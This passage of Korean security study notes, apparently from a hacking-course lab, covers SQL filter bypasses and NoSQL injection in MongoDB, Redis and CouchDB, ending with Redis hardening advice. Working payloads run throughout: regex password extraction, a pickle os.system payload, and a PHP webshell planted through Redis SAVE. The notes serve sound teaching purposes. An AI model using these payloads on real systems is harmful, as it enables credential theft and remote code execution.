	mysql> select 1 /*!union*/ select 2;
	/*
	+---+
	| 1 |
	+---+
	| 1 |
	| 2 |
	+---+
	2 rows in set (0.00 sec)
	*/


PostgreSQL 우회 기법
PostgreSQL 함수를 이용한 문자열 검사 우회

	postgres=> select chr(65);
	/*
	 chr
	-----
	 A
	*/

PostgreSQL 함수를 이용한 문자열 검사 우회 - 2

	postgres=> select concat(chr(65), chr(66));
	/*
	 concat
	--------
	 AB
	*/

PostgreSQL 가젯을 이용한 문자열 검사 우회

	postgres=> select substring(version(),23,1);
	/*
	 substring
	-----------
	 n
	*/

PostgreSQL 개행을 이용한 공백 검사 우회

	postgres=> select
	1;
	/*
	 ?column?
	----------
	        1
	*/

PostgreSQL 주석을 이용한 공백 검사 우회

	postgres=> select/**/1;
	/*
	 ?column?
	----------
	        1
	*/


MSSQL 우회 기법
MSSQL 함수를 이용한 문자열 검사 우회

	> select char(0x61);
	/*
	-
	a
	*/


MSSQL 함수를 이용한 문자열 검사 우회 - 2

	> select concat(char(0x61), char(0x62));
	/*
	--
	ab
	*/


MSSQL 가젯을 이용한 문자열 검사 우회

	> select substring(@@version,134,1);
	/*
	-
	n
	*/

MSSQL 개행을 이용한 공백 검사 우회

	> select
	1;
	/*
	-----------
	          1
	*/


MSSQL 주석을 이용한 공백 검사 우회

	> select/**/1;
	/*
	-----------
	          1
	*/


SQLite 우회 기법
SQLite 함수를 이용한 문자열 검사 우회

	sqlite> select char(0x61);
	/*
	a
	*/

SQLite 함수를 이용한 문자열 검사 우회 - 2

	sqlite> select char(0x61)||char(0x62);
	/*
	ab
	*/

SQLite 개행을 이용한 공백 검사 우회

	sqlite> select
	   ...> 1;
	/*
	1
	*/

SQLite 주석을 이용한 공백 검사 우회

	sqlite> select/**/1;
	/*
	1
	*/

SQLite 구문 검사 우회

	sqlite> select 1 union values(2);
	/*
	1
	2
	*/



# NOSQL
비관계형 데이터베이스. Not Only SQL의 의미를 담고 있다고 함
SQL을 사용하는 RDBMS와는 달리 NoSQL은 SQL를 사용하지 않고 
복잡하지 않은 데이터를 저장해 단순 검색 및 추가 검색 작업을 위함
매우 최적화된 저장 공간인 것이 큰 특징이자 RDBMS와의 차이점
키-값을 사용해 데이터를 저장하는 차이점이 존재

NoSQL은 Redis, Dynamo, CouchDB, MongoDB 등 다양한 DBMS가 존재


MongoDB
MongoDB는 JSON 형태인 도큐먼트(Document)를 저장하며
스키마를 따로 정의하지 않아 각 콜렉션(Collection)에 대한 정의가 필요하지 않음
JSON 형식으로 쿼리를 작성할 수 있음
_id 필드가 Primary Key 역할을 함
다음은 같은 역할을 함

	SELECT * FROM inventory WHERE status = "A" and qty < 30;
	db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )


MongoDB에서 주로 사용하는 연산자

	Comparison
		$eq
		지정된 값과 같은 값을 찾습니다. (equal)

		$in
		배열 안의 값들과 일치하는 값을 찾습니다. (in)

		$ne
		지정된 값과 같지 않은 값을 찾습니다. (not equal)

		$nin
		배열 안의 값들과 일치하지 않는 값을 찾습니다. (not in)

	Logical
		$and
		논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.

		$not
		쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다.

		$nor
		논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다.

		$or
		논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다.

	Element
		$exists
		지정된 필드가 있는 문서를 찾습니다.

		$type
		지정된 필드가 지정된 유형인 문서를 선택합니다.

	Evaluation
		$expr
		쿼리 언어 내에서 집계 식을 사용할 수 있습니다.

		$regex
		지정된 정규식과 일치하는 문서를 선택합니다.

		$text
		지정된 텍스트를 검색합니다.


RDBMS에서 사용하는 구문과 MongoDB에서 사용하는 구문을 비교한 것

	SELECT
		SELECT * FROM account;
		db.account.find()
		SELECT * FROM account WHERE user_id="admin";
		db.account.find(
		{user_id: "admin"}
		)
		SELECT user_idx FROM account WHERE user_id="admin";
		db.account.find(
		{ user_id: "admin" },
		{ user_idx:1, _id:0 }
		)

	INSERT
		INSERT INTO account(
		user_id,
		user_pw,
		) VALUES ("guest", "guest");
		db.account.insert({
		user_id: "guest",
		user_pw: "guest"
		})

	DELETE
		DELETE FROM account;
		db.account.remove()
		DELETE FROM account WHERE user_id="guest";
		db.account.remove( {user_id: "guest"} )

	UPDATE
		UPDATE account SET user_id="guest2" WHERE user_idx=2;
		db.account.update(
		{user_idx: 2},
		{ $set: { user_id: "guest2" } }
		)


Mongodb injection
	다음은 expres코드에 대한 실행 결과이다.
	MongoDB는 문자열이 아닌 타입의 값을 입력할 수 있고, 이를 통해 연산자를 사용할 수 있음

		//get방식
		const express = require('express');
		const app = express();
		app.get('/', function(req,res) {
		    console.log('data:', req.query.data);
		    console.log('type:', typeof req.query.data);
		    res.send('hello world');
		});
		const server = app.listen(3000, function(){
		    console.log('app.listen');
		});

		http://localhost:3000/?data=1234
		data: 1234
		type: string
		http://localhost:3000/?data[]=1234
		data: [ '1234' ]
		type: object
		http://localhost:3000/?data[]=1234&data[]=5678
		data: [ '1234', '5678' ] 
		type: object
		http://localhost:3000/?data[5678]=1234
		data: { '5678': '1234' } 
		type: object
		http://localhost:3000/?data[5678]=1234&data=0000
		data: { '5678': '1234', '0000': true } 
		type: object
		http://localhost:3000/?data[5678]=1234&data[]=0000
		data: { '0': '0000', '5678': '1234' } 
		type: object
		http://localhost:3000/?data[5678]=1234&data[1111]=0000
		data: { '1111': '0000', '5678': '1234' } 
		type: object

		//post방식
		const express = require('express');
		const app = express();
		app.use(express.json());
		app.use(express.urlencoded( {extended : false } ));
		app.get('/', function(req,res) {
		    res.send('hello world');
		});
		app.post('/post', function(req,res) {
		    console.log('data:', req.body.data);
		    console.log('type:', typeof req.body.data);
		    res.send({"status":"ok"});
		});
		const server = app.listen(3000, function(){
		    console.log('app.listen');
		});

		function post(data){
		  var url = '/post';
		  fetch(url, {
		    method: 'POST',
		    body: JSON.stringify(data),
		    headers:{
		      'Content-Type': 'application/json'
		    }
		  }).then(res => res.json())
		  .then(response => console.log('Success:', JSON.stringify(response)))
		}
		post({"data": 1234});
		// data: 1234
		// type: number
		post({"data": [1, 2, 3]});
		// data: [ 1, 2, 3 ]
		// type: object
		post({"data":{ test: 1 }});
		// data: { test: 1 }
		// type: object


	다양한 연산자, 함수를 사용해 Injection하기

		$ne
			아래는 id,pw가 a가 아닌 모든 계정정보 알아내는 모습

				http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a
				=> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]

				{"uid": "admin", "upw":  { "$ne" : "guest"} }

			위처럼 MongoDB에서는 다양한 연산자를 이용해 Blind NoSQLI를 할 수 있다.

		$where
			인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회
			field에서 사용할 수 없음

				> db.user.find({$where:"return 1==1"})
				{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
				> db.user.find({uid:{$where:"return 1==1"}})
				error: {
					"$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field",
					"code" : 17287
				}

		Blind Injection
			정규식을 사용해 식과 일치하는 데이터를 조회
			다음은 regex 연산자를 활용한 Blind NoSQL Injection 예시

				> db.user.find({upw: {$regex: "^a"}})
				> db.user.find({upw: {$regex: "^b"}})
				> db.user.find({upw: {$regex: "^c"}})
				...
				> db.user.find({upw: {$regex: "^g"}})
				{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

			where 연산자와 substring

				> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
				> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
				> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
				...
				> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
				{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }

		Time based Injection
			Sleep 함수를 통한 Time based Injection

				db.user.find({$where: `this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
				/*
				/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
				/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
				/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
				...
				/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
				=> 시간 지연 발생.
				*/

		Error based Injection
			Error based Injection

				> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
				error: {
					"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
					"code" : 16722
				}
				// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생
				> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
				// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음

	exploit
		passwd 길이 알아내
			{"uid": "admin", "upw": {"$regex":".{5}"}}
			=> admin
			{"uid": "admin", "upw": {"$regex":".{6}"}}
			=> undefined

		passwd 알아내기

			{"uid": "admin", "upw": {"$regex":"^a"}}
			admin
			{"uid": "admin", "upw": {"$regex":"^aa"}}
			undefined
			{"uid": "admin", "upw": {"$regex":"^ab"}}
			undefined
			{"uid": "admin", "upw": {"$regex":"^ap"}}
			admin
			...
			{"uid": "admin", "upw": {"$regex":"^apple$"}}

		url에서 로그인
			http://host3.dreamhack.games:15236/login?uid[$regex]=^ad&upw[$regex]=D.{*
			
			http://host3.dreamhack.games:17890/login?uid[$regex]=in$&upw[$regex]=^




Redis
키-값(Key-Value)의 쌍을 가진 데이터를 저장
다른 데이터베이스와 다르게 메모리 기반의 DBMS
메모리를 사용하기 때문에 읽고 쓰는 작업을 다른 DBMS보다 훨씬 빠르게 수행

Redis에서 데이터를 작성하고 조회하는 명령어를 입력한 모습

	$ redis-cli
	127.0.0.1:6379> SET test 1234 # SET key value
	OK
	127.0.0.1:6379> GET test # GET key
	"1234"

데이터 조회 및 조작 명령어

	GET key
	데이터 조회

	MGET key [key ...]
	여러 데이터를 조회

	SET key value
	새로운 데이터 추가

	MSET key value [key value ...]
	여러 데이터를 추가

	DEL key [key ...]
	데이터 삭제

	EXISTS key [key ...]
	데이터 유무 확인

	INCR key
	데이터 값에 1 더함

	DECR key
	데이터 값에 1 뺌


관리 명령어

	INFO [section]
	DBMS 정보 조회

	CONFIG GET parameter
	설정 조회

	CONFIG SET parameter value
	새로운 설정을 입력


공격기법

	코드를 살펴보면, 이용자가 입력하는 uid 키에 {level: 'guest'}를 값으로 저장함 req.query에 해당하는 부분에는 문자열 타입 이외에도 배열 (Array) 또는 객체 타입의 데이터도 삽입할 수 있음

		//NodeJS의 redis 모듈 사용 예시
		var express = require('express');
		var app = express();
		app.use(express.json());
		app.use(express.urlencoded( {extended : false } ));
		const redis = require("redis");
		const client = redis.createClient();
		app.get('/init', function(req,res) {
		    // client.set("key", "value");
		    client.set(req.query.uid, JSON.stringify({level: 'guest'}));
		    res.send('ok')
		});
		var server = app.listen(3000, function(){
		    console.log('app.listen');
		});

		//redis 모듈의 command 라이브러리

		// https://github.com/NodeRedis/node-redis/blob/0041e3e53d5292b13d96ce076653c5b91b314fda/lib/commands.js#L20-L25
		if (Array.isArray(arguments[0])) {
		    arr = arguments[0];
		    if (len === 2) {
		        callback = arguments[1];
		    }
		}
		return this.internal_send_command(new Command(command, arr, callback));

	결론적으로 
	문자열 타입은 key, value, callback => Command(command, [key, value], callback) 
	배열 타입은 [key, value] => Command(command, key, value)
	이런식으로 처리됨을 알 수 있다.

	따라서, 배열 타입으로 값을 입력할 경우 개발자가 의도한 값이 적용되지 않고, 임의로 입력한 값이 삽입되는 것을 알 수 있으므로, http://localhost:3000/init?uid[]=test&uid[]={"level":"admin"}와 같이 배열 타입의 인자를 전달하면 실제로 애플리케이션에서는 Command("set", "test", '{"level":"admin"}') 코드가 실행되어 공격자가 임의의 값을 가진 데이터를 생성할 수 있음

	즉, uid에 2가지 데이터를 넣어서 key로 test, value로 {"level":"admin"}가 들어가게 만드는 것


	SSRF
		Redis는 기본적으로 인증 수단이 존재하지 않으며, "127.0.0.1"로 서비스를 바인딩하기 때문에 아래와 같이 직접 접근하여 인증 과정 없이 명령어를 실행할 수 있음. 따라서 공격자는 애플리케이션의 SSRF 취약점을 통해 Redis 서버에 접근하여 데이터베이스의 정보를 획득할 수 있음

			$ echo -e 'info\r\n' | nc 211.250.216.249 7000
			$2728
			# Server
			redis_version:4.0.9
			redis_git_sha1:00000000
			redis_git_dirty:0
			redis_build_id:9435c3c2879311f3
			redis_mode:standalone
			os:Linux 5.0.0-27-generic x86_64
			arch_bits:64
			multiplexing_api:epoll
			atomicvar_api:atomic-builtin
			gcc_version:7.4.0
			process_id:13438
			run_id:61725671377fa0ba43547443df3097b0346b9bab
			tcp_port:6379
			...

		Redis는 유효하지 않은 명령어가 입력돼도 연결이 끊어지지 않고 다음 명령어를 실행함. 아래를 살펴보면, 유효하지 않은 명령어에서 에러가 발생하고 다음 명령어가 실행되는 것을 볼 수 있음. 

			#유효하지 않은 명령어 삽입
			$ echo -e "anydata: anydata\r\nget hello" | nc 127.0.0.1 6379
			-ERR unknown command 'anydata:'
			$5
			world

		대표적인 공격 기법으로는 HTTP 프로토콜을 이용한 방법이 있으며, 이는 다음과 같이 HTTP의 Body 데이터에 실행할 명령어를 포함시켜 요청을 전송함
		애플리케이션에서 Redis 명령어가 포함된 Body 데이터를 처리할 때 "SET key value" 명령어가 Redis에서 실행됨

			#HTTP Body 명령어 삽입
			POST / HTTP/1.1
			host: 127.0.0.1:6379
			user-agent: Mozilla/5.0...
			content-type: application/x-www-form-urlencoded
			data=a
			SET key value
			...

		Redis는 HTTP 프로토콜을 이용한 SSRF를 막고자 프로토콜에서 사용하는 주요 키워드가 명령어로 입력되면 연결을 끊어버려 공격이 불가능하도록 패치했음
		아래는 HTTP 프로토콜의 일부 키워드를 포함해 명령어를 입력한 모습
		명령어 실행 결과를 살펴보면, post와 host 키워드가 포함되어 있는 것을 감지하고,
		클라이언트와의 연결을 끊어 다음 명령어가 실행되지 않는 것을 확인할 수 있음
		그러나 이는 HTTP 프로토콜을 이용한 공격만을 막기 때문에 
		다른 프로토콜을 이용한 공격에는 여전히 취약할 수 밖에 없음

		#HTTP를 이용한 SSRF 공격이 불가능한 모습
		$ echo -e "post a\r\nget hello" | nc 127.0.0.1 6379
		$ echo -e "host: a\r\nget hello" | nc 127.0.0.1 6379
		# 12235:M 01 May 09:59:57.614 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.


	django-redis-cache
		django-redis-cache는 Django에서 Redis를 사용한 캐시 (Cache)를 구현할 수 있는 파이썬 모듈로, 
		많이 사용하는 웹 프레임워크 중 하나
		아래는 p_set 함수에서 cache.set 함수를 사용해 cache_memo라는 키를 생성하는 예시
			# settings.py
			CACHES = {
			    "default": {
			        "BACKEND": "django_redis.cache.RedisCache",
			        "LOCATION": "redis://127.0.0.1:6379/"
			    }
			}
			# views.py
			from django.http import HttpResponse
			from .models import Memo
			from django.core.cache import cache
			def p_set(request):
			    cache.set('cache_memo', Memo('memo test!!'))
			    return HttpResponse('set seesion')


			$ redis-cli
			127.0.0.1:6379> keys *
			1) ":1:cache_memo"
			127.0.0.1:6379> get ":1:cache_memo"
			"\x80\x04\x95\x97\x00\x00\x00\x00\x00\x00\x00\x8c\x15django.db.models.base\x94\x8c\x0emodel_unpickle\x94\x93\x94\x8c\x02dt\x94\x8c\x04Memo\x94\x86\x94\x85\x94R\x94}\x94(\x8c\x06_state\x94h\x00\x8c\nModelState\x94\x93\x94)\x81\x94\x8c\x02id\x94\x8c\x0bmemo test!!\x94\x8c\x04data\x94\x8c\x00\x94\x8c\x0f_django_version\x94\x8c\x053.0.6\x94ub."

		해당 모듈의 기본 Serializer는 PickleSerializer임
		Redis에 임의의 데이터를 저장하고, 
		해당 데이터를 Deserialize 할 수 있다면 Pickle 모듈을 이용해 공격을 수행할 수 있음

		Serialize / Deserialize
			직렬화 (Serialize)는 객체 또는 데이터의 타입을 특정한 포맷을 가진 형태로 변환하는 작업을 의미
			역직렬화 (Deserialize)는 직렬화된 데이터를 본래 객체 또는 데이터의 타입으로 되돌리는 것

			직렬화는 객체 및 데이터의 현재 상태와 타입들을 저장하고, 필요할 때 역직렬화를 통해 이들을 사용할 수 있음
			아래는 직렬화와 역질렬화를 수행하는 예제 코드
			코드를 살펴보면, 31337과 10001 데이터를 가지는 ClassA를 직렬화하고, 
			이를 역직렬화한 데이터를 ClassB에 저장함

			공격자는 역직렬화 과정을 악용하여 악의적인 행위를 수행하거나, 특정 상황에서 호출되는 메소드를 이용해 공격할 수 있음

				import pickle
				class TestClass:
				  def __init__(self, a, b):
				    self.A = a
				    self.B = b
				# TestClass 생성, ClassA로 할당
				ClassA = TestClass(31337,10001)
				# ClassA 직렬화
				ClassA_dump = pickle.dumps(ClassA)
				print(ClassA_dump)
				# ClassA 역직렬화, ClassB로 할당
				ClassB = pickle.loads(ClassA_dump)
				print(ClassB.A, ClassB.B)

				#직렬화와 역직렬화 결과

				$ python3 pickleTest.py 
				b"\x80\x03cmain\nTestClass\nq\x00)\x81q\x01}q\x02(X\x01\x00\x00\x00Aq\x03MizX\x01\x00\x00\x00Bq\x04M\x11'ub."
				31337 10001


		Serialize / Deserialize 공격
			파이썬에서 직렬화와 역직렬화를 수행하는 대표적인 모듈로 pickle과 yaml이 존재
			이 중 pickle 모듈은 객체를 직렬화하여 파일에 저장할 수 있는 기능과 파일에 저장된 객체를 가져와 역직렬화하는 기능도 제공
			모듈의 공식 문서를 살펴보면, 신뢰할 수 있는 데이터에 한해서 역직렬화를 수행하라는 경고문을 확인할 수 있음
			해당 모듈은 다양한 클래스 인스턴스를 제공하는데, 
			이 중 object.__reduce__()는 객체 계층 구조를 unpickling 할 때 객체를 재구성하는 튜플을 반환해주는 메소드로, 
			호출 가능한 객체를 반환할 수 있음

			이 말은 즉, 호출 가능한 객체에 system과 같이 명령어를 실행할 수 있는 함수를 반환하면 시스템 명령어를 실행할 수 있음
			아래는 각각 __reduce__ 메소드를 이용해 임의 코드를 실행하는 예시 코드와 실행 결과
			__reduce__ 함수를 살펴보면, os.system, ("id", )를 반환하는 것을 확인할 수 있음
			실행 결과를 살펴보면, 역직렬화를 수행하면서 id 명령어가 실행된 것을 확인할 수 있음

				import pickle
				import os
				class TestClass:
				  def __reduce__(self):
				  	return os.system, ("id", )
				ClassA = TestClass()
				# ClassA 직렬화
				ClassA_dump = pickle.dumps(ClassA)
				print(ClassA_dump)
				# 역직렬화
				pickle.loads(ClassA_dump)


				$ python3 pickleExploit.py
				b'\x80\x03cposix\nsystem\nq\x00X\x02\x00\x00\x00idq\x01\x85q\x02Rq\x03.'
				uid=1000(dreamhack) gid=1000(dreamhack) groups=1000(dreamhack)


	Redis 명령어: SAVE
		Redis는 메모리에 데이터를 저장하는 인 메모리(In-Memory) 데이터베이스
		메모리는 휘발성이라는 특징을 갖고 있기 때문에 데이터 손실 방지를 위해 일정 시간마다 메모리 데이터를 파일 시스템에 저장함
		Redis는 명령어를 이용해 메모리 데이터를 저장하는 파일의 저장 주기를 지정하거나 즉시 저장할 수 있으며 
		저장되는 파일의 경로와 이름, 그리고 저장할 데이터를 함께 설정할 수 있음

		아래는 파일 저장 경로를 “/tmp”, 파일 이름을 “redis.php”로 지정하고 셸을 실행하는 PHP 코드를 저장함
		해당 명령어가 실행되면 성공적으로 파일이 생성되며 공격자는 이를 통해 PHP 등의 다른 애플리케이션과 연계해 공격을 수행할 수 있음

			#SAVE 명령어를 통한 웹셸 삽입

			CONFIG set dir /tmp
			CONFIG set dbfilename redis.php
			SET test "<?php system($_GET['cmd']); ?>"
			SAVE

			#SAVE 명령어를 통한 웹셸 삽입 결과

			$ ls -al redis.php 
			-rw-rw---- 1 redis redis 57 May 17 16:59 redis.php
			$ xxd redis.php 
			00000000: 5245 4449 5330 3030 36fe 0000 0474 6573  REDIS0006....tes
			00000010: 741e 3c3f 7068 7020 7379 7374 656d 2824  t.<?php system($
			00000020: 5f47 4554 5b27 636d 6427 5d29 3b20 3f3e  _GET['cmd']); ?>
			00000030: ffef 0fe2 9f24 c9b8 a3                   .....$...


	Redis 명령어: SLAVEOF / REPLICAOF
		결론부터 말하면 실질적인 공격이 아닌 공격 성공 여부를 확인하기 위한 방법임
		다른 Redis의 노드를 현재 명령어를 실행하는 노드의 마스터 노드로 지정할 수 있음
		지정한 노드와 연결을 맺으면, 마스터 노드의 데이터를 복제하고 저장함
		아래는 마스터 노드를 복제하는 명령어의 예시

			#마스터 노드 복제 명령어 예시
			SLAVEOF host port
			SLAVEOF No one
			REPLICAOF host port
			REPLICAOF No one

		해당 명령어를 실행하면 마스터 노드에 네트워크 연결을 맺음
		해당 과정에서 발생하는 네트워크 트래픽을 통해 Redis 공격의 성공 여부를 원격으로 확인할 수 있음
		
		아래는 “127.0.0.1” 호스트의 8888 포트로 연결하는 명령어와 호스트에 해당하는 서버에서 지정한 포트를 바인딩하는 명령어를 실행한 모습
		포트를 바인딩하는 서버의 결과를 살펴보면, 노드의 상태를 확인하기 위한 데이터를 수신한 것을 확인할 수 있음

			#Redis 서버
			SLAVEOF 127.0.0.1 8888
			REPLICAOF 127.0.0.1 8888


			#복제할 서버
			$ nc -l 8888 -kv
			Listening on [0.0.0.0] (family 0, port 8888)
			Connection from [127.0.0.1] port 8888 [tcp/*] accepted (family 2, sport 52613)
			PING

		현대 사회에서는 Slave라는 용어의 사용을 지양하고 있기 때문에 Redis 5.0 버전부터 SLAVEOF 명령어를 대체하기 위해 REPLICAOF 명령어가 새롭게 등장했음
		그러나 최신 버전에서도 이전 버전의 명령어를 사용하는 애플리케이션을 호환하기 위해 SLAVEOF 명령어는 여전히 동작함


	Redis 명령어: MODULE LOAD
		Redis 4.0 버전부터 새로운 라이브러리를 추가해 사용할 수 있도록 module load 명령어를 제공함
		이용자는 RedisModuleSDK를 기반하여 공유 라이브러리를 제작하고, 
		해당 명령어를 통해 라이브러리를 로드하여 임의 코드를 실행할 수 있음

		아래는 RedisModuleSDK를 기반한 라이브러리 코드의 예시
		이와 같이 작성된 소스 코드를 컴파일하고, Redis 클라이언트에서 module load를 이용해 모듈 코드를 실행할 수 있음

			#RedisModuleSDK를 기반한 라이브러리 예시

			//https://github.com/RedisLabs/RedisModulesSDK/blob/e756dd897fd08ac7eb8f3eb611c2cd4b591183c3/example/module.c
			// Unit test entry point for the module
			int TestModule(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
			  RedisModule_AutoMemory(ctx);
			  RMUtil_Test(testParse);
			  RMUtil_Test(testHgetSet);
			  RedisModule_ReplyWithSimpleString(ctx, "PASS");
			  return REDISMODULE_OK;
			}
			int RedisModule_OnLoad(RedisModuleCtx *ctx) {
			...
			  // register the unit test
			  RMUtil_RegisterWriteCmd(ctx, "example.test", TestModule);
			  return REDISMODULE_OK;
			}

		아래는 앞서 작성한 소스 코드를 컴파일하고 명령어를 통해 라이브러리를 불러온 결과
		결과를 살펴보면, Redis 명령어가 실행된 것을 살펴볼 수 있음
		이와 같이 라이브러리를 업로드해 공격하기 위해서는 Redis 클라이언트가 접근할 수 있는 디렉터리에 라이브러리를 업로드 생성할 수 있어야 함

			#module load 라이브러리 로드

			$ redis-cli
			127.0.0.1:6379> module load /var/lib/redis/module.so
			OK
			127.0.0.1:6379> module list
			1) 1) "name"
			   2) "example"
			   3) "ver"
			   4) (integer) 1
			127.0.0.1:6379> EXAMPLE.TEST
			PASS


인증 체계
	Redis는 기본적으로 인증 과정 없이 조작이 가능한 DBMS
	이와 같은 이유로, 공격자는 Redis 서버에 접근이 가능한 경우 임의 명령어를 실행하는 등 중요한 정보를 탈취할 수 있음
	이러한 문제를 해결 하기 위해 인증 과정을 추가하는 방법이 있음
	Redis에서는 "/etc/redis/redis.conf" 파일을 통해 DBMS의 설정을 관리함
	그 중 requirepass는 패스워드를 지정할 수 있음
	아래는 해당 키워드를 통해 패스워드를 "pass1234"로 지정한 모습

		$ cat /etc/redis/redis.conf 
		... 
		requirepass pass1234

	해당 설정을 적용하면 DBMS 사용 시에 AUTH 명령어를 통해 인증 과정을 거쳐야 함
	추가로, Redis 6.0 버전부터 멀티 유저 (Multi-User)와 Access Control List (ACL)를 통해 접근 제어를 설정할 수 있는 기능이 등장함
	이를 통해 다양한 사용자에 대해 인증을 수행할 수 있고, 권한과 명령어 등을 분리할 수 있음

		$ sudo service redis-server restart
		...
		$ redis-cli
		127.0.0.1:6379> keys *
		(error) NOAUTH Authentication required.
		127.0.0.1:6379> AUTH pass1234
		OK
		127.0.0.1:6379> keys *
		1) "foo"


바인딩
	Redis 3.2.0 버전부터는 기본적으로 바인딩 주소가 "127.0.0.1"로 설정되어 있음
	안전한 환경을 구성하기 위함이지만 애플리케이션에 따라서 외부 접속이 가능해야 할 경우도 있을 수 있음
	이때, 개발자는 설정 파일을 수정해 바인딩 주소 변경할 수 있다
	아래는 기본 설정을 포함해 다양하게 바인딩 주소를 변경한 모습
	BIND의 인자로 "0.0.0.0" 주소를 전달할 경우 모든 IP의 접속을 허용하기 때문에 인증 과정이 미흡하거나 알려진 취약점이 존재할 경우 시스템이 취약해질 수 있음

		# 기본 설정
		BIND 127.0.0.1
		# 위험한 설정
		# BIND 127.0.0.1 # 주석 처리 시 모든 IP 접속을 허용합니다.
		BIND 0.0.0.0
		# 기능적으로 허용해야 하는 경우 권고 설정, 
		# IP 지정을 통해 해당 IP만 허용하며 허용하는 IP에 대한 주기적인 확인이 필요합니다.
		BIND 192.168.1.2 127.0.0.1


중복 키 사용
	Redis는 키와 값이 하나의 쌍을 이루어 데이터를 저장하는 구조이며, 
	일반적으로 RDBMS의 스키마/테이블 또는 MongoDB의 콜렉션과 같이 특정한 영역으로 구분해 저장하지 않음
	따라서 서로 다른 용도로 사용하는 키 명칭이 중복되는 경우가 존재
	예를 들어, Redis에서 캐시를 구현할 때 캐시 타입 별로 서버를 분리하지 않으면 이러한 문제가 생길 수 있음
	이때, 캐시 타입은 유저 정보, 인증 정보, 임시 데이터 등이 포함됨
	또한, 키 명칭을 구분자 없이 사용하고, 이용자의 입력값으로 키 명칭으로 사용할 때 발생할 수 있음

	Redis logical database는 DB를 인덱스로 구분지어 연결할 수 있는 기능을 제공함
	0부터 15, 총 16개까지 구분할 수 있습니다.

		r0 = redis.createClient({ db: 0 }); // db 0 연결
		r1 = redis.createClient({ db: 1 }); // db 1 연결
		r0.select(1, function(err){...});   // db 0 에서 1로 변경

	아래는 키가 중복될 수 있는 예시
	이용자의 메일 인증 번호와 인증 횟수를 확인하기 위한 정보를 나타내기 위해 이용자의 입력값을 키 명칭으로하여 값을 저장

		SET key value
		# 사용자 메일 인증 번호 저장 시
		SET {email} {random number}
		# 사용자 메일 인증 횟수 저장 시
		SET {email}_count 0


	위와 같은 형태로 이용자의 입력값을 키 명칭으로 지정하는 것은 애플리케이션 로직에 따라 다양한 문제가 발생할 수 있음
	공격자가 user1@dreamhack.io_count라는 메일 주소로 인증 번호를 요청하면 Redis는 아래와 같이 저장됨

		user1@dreamhack.io_count = {random number}
		user1@dreamhack.io_count_count = 0  

	또 다시 user1@dreamhack.io 메일 주소로 인증 번호를 요청하면 Redis는 아래 같이 처리함
	결과를 살펴보면, 기존에 사용되던 키가 새로 저장되는 키와 중복되어 이전에 저장된 인증 번호가 아닌 추측 가능한 숫자로 변경된 것을 확인할 수 있음
	따라서 애플리케이션의 인증 과정을 우회할 수 있음

		user1@dreamhack.io_count = 0
		user1@dreamhack.io_count_count = 0
		user1@dreamhack.io = {random number}


redis 서버 명령어
	save : 파일 저장 주기 설정
	dbfilename : 파일 저장 위치 설정
	dir : 현재 디렉토리


CouchDB
MongoDB와 같이 JSON 형태인 도큐먼트(Document)를 저장
웹 기반의 DBMS로, REST API 형식으로 요청을 처리

다음은 CouchDB 기반 레코드 업데이트 및 조회 예시

	$ curl -X PUT http://{username}:{password}@localhost:5984/users/guest -d '{"upw":"guest"}'
	{"ok":true,"id":"guest","rev":"1-22a458e50cf189b17d50eeb295231896"}
	$ curl http://{username}:{password}@localhost:5984/users/guest
	{"_id":"guest","_rev":"1-22a458e50cf189b17d50eeb295231896","upw":"guest"}


특수 구성 요소
	_ 문자로 시작하는 URL, 필드는 특수 구성 요소를 나타냄

	SERVER

		/
		인스턴스에 대한 메타 정보를 반환합니다.

		/_all_dbs
		인스턴스의 데이터베이스 목록을 반환합니다.

		/_utils
		관리자페이지로 이동합니다.

	Database

		/db
		지정된 데이터베이스에 대한 정보를 반환합니다.

		/{db}/_all_docs
		지정된 데이터베이스에 포함된 모든 도큐먼트를 반환합니다.

		/{db}/_find
		지정된 데이터베이스에서 JSON 쿼리에 해당하는 모든 도큐먼트를 반환합니다.


공격기법
	nano 패키지
		NodeJS에서 CouchDB를 사용할 때에는 주로 아파치에서 개발한 nano 패키지를 사용
		nano 패키지는 get 함수를 사용하여 _id 값을 통해 데이터를 조회하거나 find 함수를 통해 쿼리 기반으로 데이터를 가져올 수 있음
		get 함수를 통해 데이터를 조회하는 경우 특수 구성 요소인 _all_docs, _db 등에 접근해 데이터베이스의 정보를 획득할 수 있음
		find 함수를 사용하는 경우에는 연산자와 같이 객체 타입의 값을 입력해 개발자가 의도하지 않은 행위를 수행할 수 있음

